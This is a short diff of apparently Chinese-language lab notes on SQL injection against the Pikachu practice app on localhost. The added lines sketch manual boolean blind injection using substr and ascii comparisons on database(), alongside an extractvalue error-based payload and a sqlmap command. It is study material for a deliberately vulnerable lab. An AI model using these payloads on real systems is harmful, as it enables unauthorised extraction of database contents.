@@ -166,6 +166,14 @@
     1' and extractvalue(1,concat(0x5c,(select database())))and '
     发现可以返回数据库信息，后面同理
 8.基于boolian的盲注
+    手动注入思路：
+    length()
+    substr(database(),1,1) -- 取出库名第1个字符
+    substr(database(),2,1) -- 取出库名第2个字符
+    ascii('p') → 112
+    ascii('i') → 105
+    select ascii(substr(database(),1,1)) > 100;
+
     sqlmap解决：
     python sqlmap.py -u "http://127.0.0.1/pikachu/vul/sqli/sqli_search.php?name=1&submit=%E6%90%9C%E7%B4%A2"
     获得数据库版本
